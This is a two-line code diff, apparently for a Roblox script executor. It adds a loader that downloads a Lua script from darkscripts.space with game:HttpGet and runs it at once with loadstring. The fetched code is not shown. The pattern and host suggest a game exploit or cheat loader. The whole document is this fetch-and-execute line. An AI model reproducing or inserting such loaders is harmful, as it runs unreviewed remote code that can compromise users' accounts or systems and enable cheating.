@@ -1,0 +1,2 @@
+wait("0.2")
+loadstring(game:HttpGet('https://darkscripts.space/scripts/c3ee8baf-ce44-42a8-a1a3-2ef454bf97b6_1235563884601933925.lua',true))()
